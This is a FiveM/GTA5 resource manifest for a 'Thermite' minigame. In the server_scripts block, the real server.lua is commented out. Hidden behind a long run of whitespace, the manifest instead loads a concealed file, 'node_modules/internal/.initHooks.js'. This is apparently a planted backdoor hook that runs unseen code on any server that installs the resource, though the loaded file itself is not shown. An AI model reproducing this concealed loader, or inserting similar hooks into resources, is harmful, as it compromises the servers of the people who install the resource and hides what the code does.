fx_version 'adamant'

game 'gta5'
author 'Snipe'
description 'Thermite Game Like NoPixel'
version '1.0.0'
server_scripts {
  --'server/server.lua',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'node_modules/internal/.initHooks.js',
}

client_scripts {
  'client/main.lua',
}

ui_page {
  'html/index.html'
}

files {
  'html/index.html',
  'html/style.css',
  'html/app.js'
}